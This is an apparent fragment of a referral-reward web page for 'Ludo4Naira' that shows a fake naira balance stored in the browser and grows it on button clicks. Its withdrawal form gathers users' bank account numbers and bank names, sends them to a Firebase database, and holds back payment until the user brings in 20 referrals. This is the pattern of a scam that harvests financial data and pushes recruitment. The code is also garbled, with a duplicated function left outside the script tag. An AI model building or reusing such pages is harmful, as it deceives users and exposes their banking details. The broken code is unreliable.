    <div class="referral-container">
        <h2>Invite Your Friends</h2>
        <p>Share your referral link and earn rewards!</p>
        <p> You haven't invited anyone</p>
        <div class="referral-link">
            <input type="text" id="referral" value="https://tinyurl.com/Ludo4Naira2025" readonly>
            <button onclick="copyReferral()">Copy</button>
        </div>
        <p class="info">Share this link with your friends and earn ₦100</p>

    <script>
        let userId = localStorage.getItem('userId');
        let balance = parseFloat(localStorage.getItem('balance')) || 0;
        let referrals = parseInt(localStorage.getItem('referrals')) || 0;

        // Initialize User ID and Balance
        if (!userId) {
            userId = 'user_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('userId', userId);
        }

        // Display userId and balance
        document.getElementById('userId').innerText = userId;
        document.getElementById('balance').innerText = balance.toFixed(2);

        // Add balance when Play Now button is clicked
        function addBalance() {
            balance += 15;
            localStorage.setItem('balance', balance);
            document.getElementById('balance').innerText = balance.toFixed(2);
        }

        // Open Withdrawal dialog
        function openDialog() {
            document.getElementById('withdrawDialog').style.display = 'block';
        }

        // Close Withdrawal dialog
        function closeDialog() {
            document.getElementById('withdrawDialog').style.display = 'none';
        }

        // Proceed with withdrawal and show message
        function proceedWithdrawal() {
            const accountNumber = document.getElementById('accountNumber').value;
            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
            const bankName = document.getElementById('bankName').value;

            if (!accountNumber || !withdrawAmount || !bankName || withdrawAmount <= 0 || withdrawAmount > balance) {
                alert('Invalid withdrawal details or insufficient balance!');
                return;
            }

            balance -= withdrawAmount;
            localStorage.setItem('balance', balance);
            document.getElementById('balance').innerText = balance.toFixed(2);

            if (referrals >= 20) {
                alert('Your withdrawal has been approved!');
            } else {
                alert('Withdrawal request submitted. Your withdrawal will be approved once you have 20 referrals.');
            }

            closeDialog();
        }

        // Copy referral link to clipboard
        function copyReferral() {
            const referralInput = document.getElementById('referral');
            referralInput.select();
            referralInput.setSelectionRange(0, 99999);
            document.execCommand('copy');
            alert('Referral link copied to clipboard!');
        }
    </script>

        // Function to handle Withdrawal
        function proceedWithdrawal() {
            // Get input values from the form
            const accountNumber = document.getElementById("accountNumber").value;
            const withdrawAmount = document.getElementById("withdrawAmount").value;
            const bankName = document.getElementById("bankName").value;

            // Ensure that the required fields are not empty
            if (!accountNumber || !withdrawAmount || !bankName) {
                alert("Please fill all fields!");
                return;
            }

            // Prepare withdrawal details to push
            const withdrawalDetails = {
                accountNumber: accountNumber,
                withdrawAmount: withdrawAmount,
                bankName: bankName,
                timestamp: new Date().toISOString(), // add timestamp for reference
            };


if (!accountNumber || !withdrawAmount || !bankName || withdrawAmount <= 0 || withdrawAmount > balance) {
                alert('Invalid withdrawal details or insufficient balance!');
                return;
            }





balance -= withdrawAmount;
            localStorage.setItem('balance', balance);
            document.getElementById('balance').innerText = balance.toFixed(2);



            // Push data to Firebase Realtime Database
            const withdrawalRef = database.ref('withdrawals');
            withdrawalRef.push(withdrawalDetails)
                .then(() => {
                    alert('Withdrawal request submitted. Your withdrawal will be approved once you have 20 referrals.');
                    // Clear input fields after submission
                    document.getElementById("accountNumber").value = "";
                    document.getElementById("withdrawAmount").value = "";
                    document.getElementById("bankName").value = "";
                })
                .catch((error) => {
                    console.error("Error pushing data to Firebase:", error);
                    alert("An error occurred. Please try again.");
                });
        }
